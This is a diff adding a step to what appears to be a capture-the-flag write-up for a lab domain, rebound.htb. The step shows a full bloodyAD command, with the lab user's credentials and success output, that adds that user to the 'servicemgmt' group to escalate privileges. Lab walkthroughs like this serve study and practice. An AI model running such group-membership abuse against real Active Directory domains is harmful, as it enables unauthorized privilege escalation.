@@ -268,3 +268,11 @@ Ive had to use kerberos authentication to collect the loot
 ![[Pasted image 20260404152455.png]]
 I can add myself to this group
 
+# Adding `oorend` to `servicemgmt`
+```python
+faketime -f +7h bloodyAD -k --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' add groupMember 'servicemgmt' 'oorend'
+
+[+] oorend added to servicemgmt
+```
+Ive added the user to the group
+
